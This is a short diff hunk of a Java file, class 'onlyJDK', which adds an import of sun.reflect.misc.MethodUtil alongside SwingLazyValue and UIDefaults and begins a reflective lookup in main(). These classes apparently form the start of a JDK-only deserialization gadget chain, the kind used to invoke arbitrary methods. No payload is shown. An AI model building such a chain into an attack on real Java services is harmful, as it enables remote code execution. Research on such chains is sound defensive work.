@@ -9,6 +9,7 @@ import javax.activation.MimeTypeParameterList;
 import java.io.*;
 import javax.swing.UIDefaults;
 import sun.swing.SwingLazyValue;
+import sun.reflect.misc.MethodUtil;
 public class onlyJDK {
     public static void main(String[] args) throws IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException {
         Method invokeMethod = Class.forName("sun.reflect.misc.MethodUtil")
